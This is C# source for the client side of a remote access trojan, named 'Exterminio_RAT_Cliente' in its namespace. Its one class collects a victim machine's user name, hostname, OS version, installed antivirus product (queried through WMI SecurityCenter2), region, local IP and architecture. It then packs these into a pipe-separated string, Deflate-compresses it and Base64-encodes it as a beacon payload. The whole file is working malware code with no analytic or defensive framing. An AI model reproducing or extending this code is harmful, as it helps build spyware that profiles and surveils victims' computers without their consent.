using System;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Text;

namespace Exterminio_RAT_Cliente
{
    public class PaqueteInformacionEnvio
    {
        public string Id { get; set; }
        public string User { get; set; }
        public string Hostname { get; set; }
        public string SystemOS { get; set; }
        public string AV { get; set; }
        public string Pais { get; set; }
        public string IP { get; set; }
        public string Arch { get; set; }

        public PaqueteInformacionEnvio()
        {
            RecolectarInformacionSistema();
        }

        private void RecolectarInformacionSistema()
        {
            try
            {
                Console.WriteLine("=== Iniciando recolección de información del sistema ===");
                
                // Generar ID único
                Id = Guid.NewGuid().ToString().Substring(0, 8);
                Console.WriteLine($"ID generado: {Id}");

                // Obtener usuario actual
                User = Environment.UserName;
                Console.WriteLine($"Usuario: {User}");

                // Obtener hostname
                Hostname = Environment.MachineName;
                Console.WriteLine($"Hostname: {Hostname}");

                // Obtener sistema operativo
                SystemOS = Environment.OSVersion.ToString();
                Console.WriteLine($"Sistema OS: {SystemOS}");

                // Obtener antivirus
                Console.WriteLine("Obteniendo información del antivirus...");
                AV = ObtenerAntivirus();
                Console.WriteLine($"Antivirus final: {AV}");

                // Obtener país (simplificado - usar configuración regional)
                Pais = System.Globalization.RegionInfo.CurrentRegion.DisplayName;
                Console.WriteLine($"País: {Pais}");

                // Obtener IP local
                IP = ObtenerIPLocal();
                Console.WriteLine($"IP: {IP}");

                // Obtener arquitectura
                Arch = Environment.Is64BitOperatingSystem ? "x64" : "x86";
                Console.WriteLine($"Arquitectura: {Arch}");
                
                Console.WriteLine("=== Recolección de información completada ===");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error recolectando información: {ex.Message}");
                Console.WriteLine($"StackTrace: {ex.StackTrace}");
                // Valores por defecto en caso de error
                Id = "ERROR";
                User = "Unknown";
                Hostname = "Unknown";
                SystemOS = "Unknown";
                AV = "Unknown";
                Pais = "Unknown";
                IP = "Unknown";
                Arch = "Unknown";
            }
        }

        private string ObtenerAntivirus()
        {
            try
            {
                Console.WriteLine("Intentando obtener información del antivirus...");
                
                // Usar la consulta WMI específica para SecurityCenter2
                using (var searcher = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT displayName, productState, pathToSignedProductExe FROM AntiVirusProduct"))
                {
                    Console.WriteLine("Consulta WMI creada, obteniendo colección...");
                    var collection = searcher.Get();
                    Console.WriteLine($"Colección obtenida. Número de elementos: {collection.Count}");
                    
                    foreach (ManagementObject obj in collection)
                    {
                        Console.WriteLine("Procesando objeto WMI...");
                        string displayName = obj["displayName"]?.ToString() ?? "";
                        string productState = obj["productState"]?.ToString() ?? "";
                        string pathToExe = obj["pathToSignedProductExe"]?.ToString() ?? "";
                        
                        Console.WriteLine($"displayName: '{displayName}'");
                        Console.WriteLine($"productState: '{productState}'");
                        Console.WriteLine($"pathToExe: '{pathToExe}'");
                        
                        if (!string.IsNullOrEmpty(displayName))
                        {
                            // Retornar solo el nombre del antivirus sin el estado
                            Console.WriteLine($"Antivirus detectado: {displayName}");
                            return displayName;
                        }
                    }
                    
                    Console.WriteLine("No se encontraron antivirus en SecurityCenter2");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error obteniendo antivirus desde SecurityCenter2: {ex.Message}");
                Console.WriteLine($"StackTrace: {ex.StackTrace}");
                
                // Intentar con el namespace alternativo si SecurityCenter2 falla
                try
                {
                    Console.WriteLine("Intentando con namespace alternativo...");
                    using (var searcher = new ManagementObjectSearcher("SELECT displayName FROM AntiVirusProduct"))
                    {
                        var collection = searcher.Get();
                        Console.WriteLine($"Colección alternativa obtenida. Número de elementos: {collection.Count}");
                        
                        foreach (ManagementObject obj in collection)
                        {
                            string displayName = obj["displayName"]?.ToString() ?? "";
                            Console.WriteLine($"displayName alternativo: '{displayName}'");
                            
                            if (!string.IsNullOrEmpty(displayName))
                            {
                                Console.WriteLine($"Antivirus detectado (alternativo): {displayName}");
                                return displayName;
                            }
                        }
                    }
                }
                catch (Exception ex2)
                {
                    Console.WriteLine($"Error con namespace alternativo: {ex2.Message}");
                }
            }
            
            Console.WriteLine("No se pudo detectar ningún antivirus");
            return "No detectado";
        }

        private string ObtenerIPLocal()
        {
            try
            {
                string hostName = Dns.GetHostName();
                IPHostEntry hostEntry = Dns.GetHostEntry(hostName);
                
                foreach (IPAddress ip in hostEntry.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        return ip.ToString();
                    }
                }
            }
            catch
            {
                // Si no se puede obtener, usar valor por defecto
            }
            return "127.0.0.1";
        }

        public string ConvertirAString()
        {
            // Convertir toda la información a un solo string separado por |
            return $"{Id}|{User}|{Hostname}|{SystemOS}|{AV}|{Pais}|{IP}|{Arch}";
        }

        public string ComprimirYCodificar()
        {
            try
            {
                // Convertir a string
                string informacion = ConvertirAString();
                
                // Comprimir con Deflate
                byte[] datosOriginales = Encoding.UTF8.GetBytes(informacion);
                byte[] datosComprimidos;
                
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(outputStream, CompressionMode.Compress))
                    {
                        deflateStream.Write(datosOriginales, 0, datosOriginales.Length);
                    }
                    datosComprimidos = outputStream.ToArray();
                }
                
                // Convertir a Base64
                string base64String = Convert.ToBase64String(datosComprimidos);
                
                return base64String;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en compresión y codificación: {ex.Message}");
                return "";
            }
        }

        public override string ToString()
        {
            string resultado = $"ID: {Id}, User: {User}, Host: {Hostname}, OS: {SystemOS}, AV: {AV}, País: {Pais}, IP: {IP}, Arch: {Arch}";
            Console.WriteLine($"ToString() resultado: {resultado}");
            return resultado;
        }
    }
}
